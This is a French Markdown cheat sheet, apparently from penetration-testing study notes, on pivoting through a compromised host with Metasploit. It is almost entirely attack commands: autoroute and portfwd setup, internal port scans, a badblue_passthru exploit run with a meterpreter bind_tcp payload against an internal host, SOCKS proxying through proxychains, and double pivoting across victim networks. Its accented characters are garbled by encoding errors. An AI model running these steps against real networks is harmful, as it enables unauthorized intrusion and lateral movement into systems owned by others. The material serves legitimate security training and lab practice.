# üîÑ Pivoting avec Metasploit

[‚Üê Retour √† la table des mati√®res](../README.md)

## Concepts de base

Le pivoting permet d'acc√©der √† des r√©seaux internes via une machine compromise. Essentiel quand la cible finale n'est pas directement accessible depuis l'attaquant.

### Architecture typique
```
Attaquant ‚Üí Machine Compromise ‚Üí R√©seau Interne
           (Pivot Point)        (Cibles finales)
```

## Configuration du Pivoting - M√©thode Compl√®te

### √âtape 1 : Compromission de la premi√®re cible
```bash
# Une fois Meterpreter obtenu sur la victim-1
# R√©cup√©rer la configuration r√©seau
ipconfig
ifconfig
```

### √âtape 2 : D√©couverte du r√©seau interne
```bash
# Dans le Meterpreter, identifier les r√©seaux
ipconfig
# Exemple de sortie : 10.2.16.100/20

# Ajouter la route vers le r√©seau interne
run autoroute -s 10.2.16.0/20

# V√©rifier les routes
run autoroute -p
```

### √âtape 3 : Gestion des sessions
```bash
# Mettre la session en arri√®re-plan
background

# Renommer la session pour plus de clart√©
sessions -n victim-1 -i 1

# Lister les sessions actives
sessions -l
```

### √âtape 4 : Scan du r√©seau interne
```bash
# Scanner la victim-2 via le pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.2.16.101
set PORTS 1-1000
set THREADS 20
run

# Exemple : port 80 d√©couvert ouvert
```

### √âtape 5 : Port Forwarding pour acc√®s web
```bash
# Retourner sur la session Meterpreter
sessions -i 1

# Configurer le port forwarding
portfwd add -l 1234 -p 80 -r 10.2.16.101

# V√©rifier les redirections actives
portfwd list

# Mettre la session en arri√®re-plan
background
```

### √âtape 6 : Scan d√©taill√© via port forwarding
```bash
# Scanner le service redirig√©
db_nmap -sS -sV -p1234 localhost

# Acc√®s web depuis le navigateur : http://localhost:1234
```

## Exploitation via Pivot

### Utilisation de Bind TCP au lieu de Reverse TCP
```bash
# Pour la victim-2, utiliser bind_tcp car reverse_tcp ne fonctionnera pas
# (la victim-2 ne peut pas joindre directement l'attaquant)

use exploit/windows/http/badblue_passthru
set RHOSTS 10.2.16.101
set RPORT 80
set PAYLOAD windows/meterpreter/bind_tcp
set RHOST 10.2.16.101
exploit
```

### Upgrade de session
```bash
# Upgrade une session shell Unix vers Meterpreter
sessions -u session_id
```

## Configuration SOCKS Proxy

### Serveur SOCKS dans Metasploit
```bash
# D√©marrer un serveur SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
run
```

### Configuration Proxychains
```bash
# √âditer le fichier de configuration
nano /etc/proxychains4.conf

# Ajouter ou v√©rifier la ligne :
# socks4 127.0.0.1 9050
```

### Utilisation avec Proxychains
```bash
# Scanner via proxychains
proxychains nmap -sT -Pn target_ip

# Acc√®s SSH via proxy
proxychains ssh user@target_ip

# Navigation web via proxy
proxychains firefox
```

## Techniques Avanc√©es

### Double Pivoting
```bash
# Sc√©nario : Attaquant ‚Üí Victim-1 ‚Üí Victim-2 ‚Üí Victim-3

# 1. Premier pivot (d√©j√† configur√©)
run autoroute -s 10.2.16.0/20

# 2. Compromettre victim-2 et d√©couvrir un nouveau r√©seau
# Sur victim-2, d√©couverte de 172.16.0.0/24

# 3. Ajouter route pour le nouveau r√©seau via victim-2
sessions -i 2
run autoroute -s 172.16.0.0/24
```

### Pivoting multi-sessions
```bash
# G√©rer plusieurs sessions de pivot
sessions -l
# Session 1 : victim-1 (pivot vers 10.2.16.0/20)
# Session 2 : victim-2 (pivot vers 172.16.0.0/24)

# Chaque session maintient ses propres routes
```

## Nettoyage et Suppression

### Suppression des routes
```bash
# Supprimer une route sp√©cifique
run autoroute -d 10.2.16.0/20

# Supprimer toutes les routes
run autoroute -D
```

### Suppression du port forwarding
```bash
# Supprimer une redirection sp√©cifique
portfwd delete -l 1234 -p 80 -r 10.2.16.101

# Supprimer toutes les redirections
portfwd flush
```

## D√©pannage

### Probl√®mes courants
```bash
# V√©rifier la connectivit√© via le pivot
sessions -i 1
shell
ping 10.2.16.101

# V√©rifier les routes actives
run autoroute -p

# V√©rifier les redirections de port
portfwd list
```

### Optimisation des performances
```bash
# Ajuster les timeouts pour les r√©seaux lents
set ConnectTimeout 30
set TcpTimeout 30

# R√©duire le nombre de threads pour la stabilit√©
set THREADS 5
```

## Ressources Utiles

- Documentation officielle Metasploit sur le pivoting
- [Guide des payloads bind vs reverse](../08-payloads/reverse-shells.md)
- [Configuration de proxychains](../06-tools/)
